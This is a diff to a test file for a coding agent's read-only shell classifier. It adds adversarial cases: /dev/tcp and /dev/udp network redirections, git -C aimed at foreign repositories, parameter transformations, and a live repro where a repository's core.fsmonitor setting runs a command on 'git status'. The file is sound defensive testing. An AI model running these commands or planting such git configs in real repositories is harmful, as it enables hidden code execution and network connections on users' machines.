@@ -5,15 +5,25 @@
  * read as read-only.
  */
 
-import { describe, it, expect } from "vitest";
-import { readFileSync } from "node:fs";
-import { dirname, resolve } from "node:path";
+import { describe, it, expect, afterAll } from "vitest";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import { tmpdir } from "node:os";
+import { dirname, join, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
-import { READONLY_GIT, READONLY_PROGRAMS, readOnlyBash } from "./readonly_bash.js";
+import { READONLY_GIT, READONLY_PROGRAMS, gitRepoWhy, readOnlyBash, type ReadOnlyWhere } from "./readonly_bash.js";
 import { callNeedsApproval, readonlyBashExempt } from "./tools.js";
 import { auditSurface, parseToml, resolveReadonlyBash, type GnomonConfig } from "./config.js";
 
 const here = dirname(fileURLToPath(import.meta.url));
+
+// git is read-only only in the project's own repository, so the tables are
+// read as a line run at the root of a project whose `.git` is right there.
+const scratch = realpathSync(mkdtempSync(join(tmpdir(), "gnomon-ro-")));
+const project = join(scratch, "project");
+mkdirSync(join(project, ".git"), { recursive: true });
+const AT_ROOT: ReadOnlyWhere = { root: project, cwd: project };
+afterAll(() => rmSync(scratch, { recursive: true, force: true }));
 
 const READ_ONLY = [
   "ls",
@@ -55,10 +65,11 @@ const READ_ONLY = [
   "git branch --show-current",
   "git branch --list 'feat/*'",
   "git branch --contains HEAD",
-  "git -C ../other status",
+  "git -C . status",
   "git --no-pager log -n 1",
   "cd src && ls",
-  "cd packages/gnomon-core; git log -n 1 | head -3",
+  "cd packages/gnomon-core; ls | head -3",
+  "git log -n 1 | head -3; cd src",
   "git log --oneline | head -20",
   "ls 2>/dev/null",
   "ls nope 2>&1 | head",
@@ -190,6 +201,39 @@ const NOT_READ_ONLY: Array<[string, RegExp?]> = [
   ["ls &", /background/],
   ["ls & rm x", /background|rm/],
   ["cd a b", /more than one/],
+  // git outside the project's repository reads a configuration that may run
+  // a program (core.fsmonitor, diff.external, textconv, gpg.program)
+  ["git -C ../other status", /-C/],
+  ["git -C /tmp/evil status", /-C/],
+  ["git -C ~/evil log -p", /-C/],
+  ["git -C . -C sub status", /more than one -C/],
+  ["cd /tmp/evil && git status", /after a cd/],
+  ["cd packages/gnomon-core; git log -n 1 | head -3", /after a cd/],
+  ["cd . && git diff", /after a cd/],
+  // A redirection from or to /dev/tcp or /dev/udp is a network connection,
+  // input included; a target that expands could be one
+  ["cat < /dev/tcp/example.com/80", /network/],
+  ["head -c1 </dev/udp/1.2.3.4/53", /network/],
+  ["cat 0</dev/tcp/example.com/80", /network/],
+  ["wc -c <>/dev/tcp/example.com/80", /network/],
+  ["cat <&/dev/tcp/example.com/80", /network/],
+  ["ls >/dev/udp/1.2.3.4/53", /network/],
+  ["cat < //dev/tcp/example.com/80", /network/],
+  ["cat < /dev/./tcp/example.com/80", /network/],
+  ["cat < /dev/tcp", /network/],
+  ["cd /dev && cat < tcp/example.com/80", /network/],
+  ["cd /dev/udp; head -c1 < 1.2.3.4/53", /network/],
+  ["cd / && cat < dev/tcp/example.com/80", /network/],
+  ["cd \"$D\" && cat < tcp/example.com/80", /network/],
+  ['cat < "$T"', /expands/],
+  ["cat < $T", /expands/],
+  ["cat < ~/x", /expands/],
+  // Parameter transformations: @P and @E evaluate the value
+  ["echo ${x@P}", /transformation/],
+  ["echo ${x@E}", /transformation/],
+  ['echo "${x@P}"', /transformation/],
+  ["echo ${x@Q}", /transformation/],
+  ["cat <<EOF\n${PS1@P}\nEOF", /transformation/],
   // Degenerate
   ["", /empty/],
   ["   ", /empty/],
@@ -199,14 +243,14 @@ const NOT_READ_ONLY: Array<[string, RegExp?]> = [
 describe("readOnlyBash — what reads only", () => {
   for (const cmd of READ_ONLY) {
     it(`read-only: ${JSON.stringify(cmd).slice(0, 80)}`, () => {
-      const r = readOnlyBash(cmd);
+      const r = readOnlyBash(cmd, AT_ROOT);
       expect(r, r.why).toMatchObject({ readonly: true });
       expect(r.programs.length).toBeGreaterThan(0);
     });
   }
 
   it("names the programs it was read as, git subcommands included, once each", () => {
-    expect(readOnlyBash("git log -n 1 | head; git status; git -C x status").programs).toEqual(["git log", "head", "git status"]);
+    expect(readOnlyBash("git log -n 1 | head; git status; git -C . status", AT_ROOT).programs).toEqual(["git log", "head", "git status"]);
   });
 
   it("a non-string is not a command", () => {
@@ -218,7 +262,7 @@ describe("readOnlyBash — what reads only", () => {
 describe("readOnlyBash — what does not (adversarial)", () => {
   for (const [cmd, why] of NOT_READ_ONLY) {
     it(`not read-only: ${JSON.stringify(cmd).slice(0, 80)}`, () => {
-      const r = readOnlyBash(cmd);
+      const r = readOnlyBash(cmd, AT_ROOT);
       expect(r.readonly).toBe(false);
       expect(r.programs).toEqual([]);
       if (why) expect(r.why).toMatch(why);
@@ -238,9 +282,102 @@ describe("conformance/guard_cases.json readonly_bash: each case's `readonly` is 
   }).readonly_bash.cases;
   for (const c of cases) {
     it(c.name, () => {
-      expect(readOnlyBash(c.input.command).readonly).toBe(c.readonly);
+      expect(readOnlyBash(c.input.command, AT_ROOT).readonly).toBe(c.readonly);
     });
   }
+});
+
+/** git in `dir`, as the reviewer's repro ran it. */
+function gitIn(dir: string, ...args: string[]): void {
+  const r = spawnSync("git", args, { cwd: dir, encoding: "utf-8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } });
+  if (r.error) throw r.error;
+}
+
+describe("readOnlyBash — git only in the project's own repository (a foreign repository's config runs programs)", () => {
+  // The repro: a repository whose config names a program git runs on a plain
+  // `git status`. git_hooks protects only the project's .git/config.
+  const base = join(scratch, "git");
+  const proj = join(base, "proj");
+  const evil = join(base, "evil");
+  const pwned = join(evil, "PWNED");
+  for (const d of [proj, evil]) {
+    mkdirSync(d, { recursive: true });
+    gitIn(d, "init", "-q");
+  }
+  gitIn(evil, "config", "core.fsmonitor", "touch PWNED; false");
+  const where: ReadOnlyWhere = { root: proj, cwd: proj };
+
+  it("the repro is real: `git -C evil status` runs evil's core.fsmonitor", () => {
+    rmSync(pwned, { force: true });
+    gitIn(base, "-C", "evil", "status");
+    expect(existsSync(pwned)).toBe(true);
+    rmSync(pwned, { force: true });
+  });
+
+  it("git -C another repository is not read-only, absolute or relative", () => {
+    expect(readOnlyBash(`git -C ${evil} status`, where)).toMatchObject({ readonly: false, why: expect.stringMatching(/-C/) });
+    expect(readOnlyBash("git -C ../evil status", where)).toMatchObject({ readonly: false, why: expect.stringMatching(/-C/) });
+    expect(readOnlyBash(`git -C ${evil} diff`, where).readonly).toBe(false);
+    expect(readOnlyBash(`git -C ${evil} log -p`, where).readonly).toBe(false);
+    expect(readOnlyBash(`git -C ${evil} show --show-signature`, where).readonly).toBe(false);
+  });
+
+  it("git after a cd on the same line is not read-only", () => {
+    expect(readOnlyBash(`cd ${evil} && git status`, where)).toMatchObject({ readonly: false, why: expect.stringMatching(/after a cd/) });
+    expect(readOnlyBash(`cd ${proj} && git status`, where)).toMatchObject({ readonly: false, why: expect.stringMatching(/after a cd/) });
+  });
+
+  it("-C . and -C <the project root> are read-only; the root reached through a symlink and `..` is followed as chdir() does", () => {
+    expect(readOnlyBash("git -C . status", where).readonly).toBe(true);
+    expect(readOnlyBash(`git -C ${proj} status`, where).readonly).toBe(true);
+    expect(readOnlyBash(`git -C ${proj}/ status`, { root: proj, cwd: evil }).readonly).toBe(true);
+    // proj/link -> evil/sub, so `link/..` is evil to chdir(), though it reads as proj.
+    mkdirSync(join(evil, "sub"), { recursive: true });
+    symlinkSync(join(evil, "sub"), join(proj, "link"));
+    try {
+      expect(readOnlyBash("git -C link/.. status", where)).toMatchObject({ readonly: false, why: expect.stringMatching(/-C/) });
+    } finally {
+      rmSync(join(proj, "link"), { force: true });
+    }
+  });
+
+  it("a working directory outside the project, or in a repository nested in it, is not read-only", () => {
+    expect(readOnlyBash("git status", { root: proj, cwd: evil })).toMatchObject({ readonly: false, why: expect.stringMatching(/outside the project root/) });
+    const nested = join(proj, "vendor", "evil");
+    mkdirSync(nested, { recursive: true });
+    gitIn(nested, "init", "-q");
+    expect(readOnlyBash("git status", { root: proj, cwd: nested })).toMatchObject({ readonly: false, why: expect.stringMatching(/nested repository/) });
+    expect(readOnlyBash("git status", { root: proj, cwd: join(nested, "deeper") }).readonly).toBe(false);
+    // A bare repository (HEAD, config, objects, refs) is a repository too.
+    const bare = join(proj, "vendor", "bare.git");
+    gitIn(proj, "init", "-q", "--bare", bare);
+    expect(readOnlyBash("git log -p", { root: proj, cwd: bare })).toMatchObject({ readonly: false, why: expect.stringMatching(/HEAD/) });
+    // A plain subdirectory of the project's own repository is fine.
+    mkdirSync(join(proj, "src"), { recursive: true });
+    expect(readOnlyBash("git status", { root: proj, cwd: join(proj, "src") }).readonly).toBe(true);
+  });
+
+  it("a project root below its repository's top level: git at the root only", () => {
+    const top = join(base, "mono");
+    const sub = join(top, "packages", "app");
+    mkdirSync(join(sub, "src"), { recursive: true });
+    gitIn(top, "init", "-q");
+    expect(gitRepoWhy(sub, sub)).toBeNull();
+    expect(readOnlyBash("git status", { root: sub, cwd: sub }).readonly).toBe(true);
+    expect(readOnlyBash("git status", { root: sub, cwd: join(sub, "src") })).toMatchObject({ readonly: false, why: expect.stringMatching(/top level/) });
+    writeFileSync(join(sub, "HEAD"), "ref: refs/heads/main\n");
+    expect(readOnlyBash("git status", { root: sub, cwd: sub })).toMatchObject({ readonly: false, why: expect.stringMatching(/HEAD/) });
+  });
+
+  it("git fails closed where the reader cannot know where it runs; other programs do not need to know", () => {
+    expect(readOnlyBash("git status")).toMatchObject({ readonly: false, why: expect.stringMatching(/not told/) });
+    expect(readOnlyBash("git status", { root: proj, cwd: null })).toMatchObject({ readonly: false, why: expect.stringMatching(/not known/) });
+    expect(readOnlyBash("git -C . status", { root: proj, cwd: null }).readonly).toBe(false);
+    expect(readOnlyBash("git -C sub status", { root: proj, cwd: null }).readonly).toBe(false);
+    // An absolute -C naming the root needs no working directory.
+    expect(readOnlyBash(`git -C ${proj} status`, { root: proj, cwd: null }).readonly).toBe(true);
+    expect(readOnlyBash("ls; cat a").readonly).toBe(true);
+  });
 });
 
 describe("[approval] readonly_bash — the setting", () => {
@@ -276,6 +413,16 @@ describe("[approval] readonly_bash — the setting", () => {
     expect(callNeedsApproval("write", { path: "x", content: "" }, { gate: "on_write", config: on })).toBe(true);
     expect(readonlyBashExempt("bash", ls, { gate: "on_write", config: on })).toMatchObject({ readonly: true, programs: ["ls"] });
     expect(readonlyBashExempt("bash", ls, { gate: "on_write", config: undefined })).toBeNull();
+  });
+
+  it("judges git where the line runs: the root unless bashCwd says otherwise, never without a root or with bashCwd null", () => {
+    const on = cfg(`gate = "on_write"\nreadonly_bash = "allow"`);
+    const status = { command: "git status" };
+    expect(callNeedsApproval("bash", status, { gate: "on_write", config: on, root: project })).toBe(false);
+    expect(callNeedsApproval("bash", status, { gate: "on_write", config: on })).toBe(true);
+    expect(callNeedsApproval("bash", status, { gate: "on_write", config: on, root: project, bashCwd: null })).toBe(true);
+    expect(callNeedsApproval("bash", status, { gate: "on_write", config: on, root: project, bashCwd: scratch })).toBe(true);
+    expect(callNeedsApproval("bash", status, { gate: "on_write", config: on, root: project, bashCwd: project })).toBe(false);
   });
 
   it("is a known [approval] key, and a value other than ask/allow is warned (it falls back to ask)", () => {
